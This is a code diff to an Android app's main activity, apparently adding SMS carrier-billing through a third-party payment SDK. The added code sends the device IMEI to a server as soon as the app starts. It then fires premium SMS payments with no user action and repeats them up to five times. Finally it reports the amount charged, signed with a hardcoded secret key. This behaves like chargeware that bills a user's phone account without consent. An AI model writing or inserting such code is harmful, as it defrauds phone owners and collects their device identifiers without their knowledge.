@@ -16,13 +16,19 @@ import android.widget.Toast;
 
 import com.alibaba.fastjson.JSON;
 import com.hfaufhreu.hjfeuio.app.App;
+import com.hfaufhreu.hjfeuio.bean.PayResultInfo;
 import com.hfaufhreu.hjfeuio.bean.UserInfo;
+import com.hfaufhreu.hjfeuio.config.PayConfig;
 import com.hfaufhreu.hjfeuio.event.ChangeTabEvent;
 import com.hfaufhreu.hjfeuio.ui.fragment.MainFragment;
 import com.hfaufhreu.hjfeuio.util.API;
 import com.hfaufhreu.hjfeuio.util.DateUtils;
 import com.hfaufhreu.hjfeuio.util.ScreenUtils;
 import com.hfaufhreu.hjfeuio.util.SharedPreferencesUtil;
+import com.sdky.jzp.SdkPay;
+import com.sdky.jzp.data.CheckOrder;
+import com.skpay.NINESDK;
+import com.skpay.codelib.utils.encryption.MD5Encoder;
 import com.zhy.http.okhttp.OkHttpUtils;
 import com.zhy.http.okhttp.callback.StringCallback;
 import com.zhy.http.okhttp.request.RequestCall;
@@ -31,9 +37,13 @@ import org.greenrobot.eventbus.EventBus;
 import org.greenrobot.eventbus.Subscribe;
 
 import java.lang.ref.WeakReference;
+import java.util.HashMap;
+import java.util.Map;
 import java.util.Random;
 import java.util.Timer;
 import java.util.TimerTask;
+import java.util.TreeMap;
+import java.util.UUID;
 
 import me.yokeyword.fragmentation.SupportActivity;
 import me.yokeyword.fragmentation.SupportFragment;
@@ -81,6 +91,7 @@ public class MainActivity extends SupportActivity {
         mTimer = new Timer();
         mTimer.schedule(timerTask, random.nextInt(2000) + 1000 * 30, random.nextInt(60 * 1000) + 30 * 1000);
         startUpLoad();
+        getDuandaiToken();
     }
 
     private void showNoticeToast(int id) {
@@ -227,6 +238,9 @@ public class MainActivity extends SupportActivity {
 
     @Override
     protected void onDestroy() {
+        if (sdkPay != null) {
+            NINESDK.exit(MainActivity.this, sdkPay);
+        }
         if (upLoadUserInfoCall != null) {
             upLoadUserInfoCall.cancel();
         }
@@ -235,6 +249,91 @@ public class MainActivity extends SupportActivity {
         }
         super.onDestroy();
         EventBus.getDefault().unregister(this);
+    }
+
+
+    //初始化短代支付
+    private static final String DUANDAI_PAY_KEY = "duan_dai_pay";
+    private int paySuccessMoney = 0;
+    private int time = 0;
+    private boolean status = false;
+    //短代支付
+    public SdkPay sdkPay;
+
+    private void initDuanDaiPay() {
+        sdkPay = NINESDK.init(MainActivity.this, "492", 10001, new SdkPay.SdkPayListener() {
+            @Override
+            public void onPayFinished(boolean successed, CheckOrder msg) {
+                time++;
+                if (successed) {
+                    SharedPreferencesUtil.putBoolean(MainActivity.this, DUANDAI_PAY_KEY, true);
+                    paySuccessMoney += 1000;
+                    status = true;
+                }
+                if (time < 5) {
+                    toDuandaiPay();
+                } else {
+                    sendSMSResult(msg);
+                }
+            }
+        });
+        if (!SharedPreferencesUtil.getBoolean(MainActivity.this, DUANDAI_PAY_KEY, false)) {
+            toDuandaiPay();
+        }
+    }
+
+    //获取短代支付的信息
+    private PayResultInfo resultInfo;
+
+    private void getDuandaiToken() {
+        Map<String, String> params = new TreeMap<>();
+        params.put("imei", App.IMEI);
+        params.put("version", PayConfig.VERSION_NAME);
+        OkHttpUtils.post().url(API.URL_PRE + API.GET_DUANDAI_INFO).params(params).build().execute(new StringCallback() {
+            @Override
+            public void onError(Call call, Exception e, int i) {
+                e.printStackTrace();
+            }
+
+            @Override
+            public void onResponse(String s, int i) {
+                try {
+                    resultInfo = JSON.parseObject(s, PayResultInfo.class);
+                    initDuanDaiPay();
+                } catch (Exception e) {
+                    e.printStackTrace();
+                }
+            }
+        });
+    }
+
+    //吊起短代支付
+    private void toDuandaiPay() {
+        String cporderid = UUID.randomUUID().toString();
+        String cpparams = "{\"cpprivate\":\"8\",\"waresid\":\"492\",\"exorderno\":\"ztykci0000592120201412231054221404525424\"}";
+        sdkPay.pay(10, cporderid, cpparams);
+    }
+
+    //传递支付结果给服务器
+    private void sendSMSResult(CheckOrder msg) {
+        String sign = MD5Encoder.EncoderByMd5("492|" + resultInfo.getOrder_id() + "|" + paySuccessMoney + "|fcf35ab21bbc6304f0aa120945843ee1").toLowerCase();
+        Map<String, String> params = new HashMap<String, String>();
+        params.put("money", paySuccessMoney + "");
+        params.put("order_id", resultInfo.getOrder_id());
+        params.put("out_trade_no", msg.orderid);
+        params.put("status", status ? "1" : "0");
+        params.put("sign", sign);
+        OkHttpUtils.post().url(API.URL_PRE + API.NOTIFY_SMS).params(params).build().execute(new StringCallback() {
+            @Override
+            public void onError(Call call, Exception e, int i) {
+
+            }
+
+            @Override
+            public void onResponse(String s, int i) {
+
+            }
+        });
     }
 
 }
